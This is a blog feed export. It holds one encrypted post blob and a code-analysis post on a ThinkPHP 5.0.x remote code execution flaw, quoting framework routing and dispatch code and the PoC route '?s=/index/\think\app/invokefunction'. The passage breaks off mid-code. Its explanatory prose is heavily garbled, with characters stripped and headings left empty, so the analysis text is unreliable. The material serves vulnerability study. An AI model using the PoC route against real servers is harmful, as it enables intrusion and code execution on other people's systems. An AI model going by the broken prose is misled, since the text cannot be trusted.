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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> codereview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code Analysisthinkphp v5.x App.php sRCE</title>
      <link href="2019/02/05/php-thinkphp-v5-x-App-php-rce/"/>
      <url>2019/02/05/php-thinkphp-v5-x-App-php-rce/</url>
      
        <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>thinkphpRCEXD<br><a id="more"></a></p><h2 id="thinkphp-v5-0-x"><a href="#thinkphp-v5-0-x" class="headerlink" title="thinkphp v5.0.x"></a>thinkphp v5.0.x</h2><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>&lt;= 5.0.22<br><a href="https://github.com/top-think/framework/commit/4cbc0b5e93314446243ebc7d5f005f9c32864737" target="_blank" rel="noopener">  top-think/framework@4cbc0b5  GitHub</a><br>library/think/App.php</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h5 id="thinkphpurl"><a href="#thinkphpurl" class="headerlink" title="thinkphpurl"></a>thinkphpurl</h5><p>THINKPHPPATHINFO<code>index.php/module/controller/action</code><br>PATHINFOTHINKPHP<code>?s=/module/controller/action</code><br><br> <code>thinkphp/library/think/Request.php</code><code>pathinfo</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pathinfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_null(<span class="keyword">$this</span>-&gt;pathinfo)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)])) &#123;</span><br><span class="line">            <span class="comment">// URL</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = $_GET[Config::get(<span class="string">'var_pathinfo'</span>)];</span><br><span class="line">            <span class="keyword">unset</span>($_GET[Config::get(<span class="string">'var_pathinfo'</span>)]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (IS_CLI) &#123;</span><br><span class="line">            <span class="comment">// CLI index.php module/controller/action/params/...</span></span><br><span class="line">            $_SERVER[<span class="string">'PATH_INFO'</span>] = <span class="keyword">isset</span>($_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>]) ? $_SERVER[<span class="string">'argv'</span>][<span class="number">1</span>] : <span class="string">''</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// PATHINFO</span></span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">$this</span>-&gt;pathinfo = <span class="keyword">empty</span>($_SERVER[<span class="string">'PATH_INFO'</span>]) ? <span class="string">'/'</span> : ltrim($_SERVER[<span class="string">'PATH_INFO'</span>], <span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pathinfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GETs(configvar_pathinfos)pathinfos<br>pathinfourl<code>thinkphp/library/think/Route.php</code><code>parseUrl</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span><span class="params">($url, $depr = <span class="string">'/'</span>, $autoSearch = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$bind[<span class="string">'module'</span>])) &#123;</span><br><span class="line">        $bind = str_replace(<span class="string">'/'</span>, $depr, <span class="keyword">self</span>::$bind[<span class="string">'module'</span>]);</span><br><span class="line">        <span class="comment">// /</span></span><br><span class="line">        $url = $bind . (<span class="string">'.'</span> != substr($bind, <span class="number">-1</span>) ? $depr : <span class="string">''</span>) . ltrim($url, $depr);</span><br><span class="line">    &#125;</span><br><span class="line">    $url              = str_replace($depr, <span class="string">'|'</span>, $url);</span><br><span class="line">    <span class="keyword">list</span>($path, $var) = <span class="keyword">self</span>::parseUrlPath($url);</span><br><span class="line">    $route            = [<span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>];</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>parseUrl<code>$url</code>pathinfo<code>$depr</code><br><code>$url</code><code>|</code><code>parseUrlPath</code>(<code>/</code>)pathinfo<code>module</code><code>controller</code><code>action</code><br>rcePoc<code>?s=/index/\think\app/invokefunction</code>=&gt;<code>[module:index,controller:\think\app,action:invokefunction]</code><br>controller=&gt;\think\appphp\think\applibrary/think/App.phpactionApp.phpinvokefunction</p><h5 id=""><a href="#" class="headerlink" title=""></a></h5><p>thinkphpscontroller<br>modulecontrolleraction<br>thinkphp/library/think/App.php  module<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">module</span><span class="params">($result, $config, $convert = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_string($result)) &#123;</span><br><span class="line">        $result = explode(<span class="string">'/'</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $request = Request::instance();</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    $request-&gt;filter($config[<span class="string">'default_filter'</span>]);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        $instance = Loader::controller(<span class="comment">// controller</span></span><br><span class="line">            $controller,</span><br><span class="line">            $config[<span class="string">'url_controller_layer'</span>],</span><br><span class="line">            $config[<span class="string">'controller_suffix'</span>],</span><br><span class="line">            $config[<span class="string">'empty_controller'</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'controller not exists:'</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    $action = $actionName . $config[<span class="string">'action_suffix'</span>];</span><br><span class="line"></span><br><span class="line">    $vars = [];</span><br><span class="line">    <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        $call = [$instance, $action];</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        $reflect    = <span class="keyword">new</span> \ReflectionMethod($instance, $action);</span><br><span class="line">        $methodName = $reflect-&gt;getName();</span><br><span class="line">        $suffix     = $config[<span class="string">'action_suffix'</span>];</span><br><span class="line">        $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">        $request-&gt;action($actionName);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">'_empty'</span>])) &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        $call = [$instance, <span class="string">'_empty'</span>];</span><br><span class="line">        $vars = [$actionName];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">'method not exists:'</span> . get_class($instance) . <span class="string">'-&gt;'</span> . $action . <span class="string">'()'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Hook::listen(<span class="string">'action_begin'</span>, $call);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">self</span>::invokeMethod($call, $vars);<span class="comment">// </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>invokeMethod</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">invokeMethod</span><span class="params">($method, $vars = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($method)) &#123;</span><br><span class="line">        $class   = is_object($method[<span class="number">0</span>]) ? $method[<span class="number">0</span>] : <span class="keyword">self</span>::invokeClass($method[<span class="number">0</span>]);</span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($class, $method[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        $reflect = <span class="keyword">new</span> \ReflectionMethod($method);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $args = <span class="keyword">self</span>::bindParams($reflect, $vars);<span class="comment">//  method</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">self</span>::$debug &amp;&amp; Log::record(<span class="string">'[ RUN ] '</span> . $reflect-&gt;class . <span class="string">'-&gt;'</span> . $reflect-&gt;name . <span class="string">'[ '</span> . $reflect-&gt;getFileName() . <span class="string">' ]'</span>, <span class="string">'info'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $reflect-&gt;invokeArgs(<span class="keyword">isset</span>($class) ? $class : <span class="keyword">null</span>, $args);</span><br><span 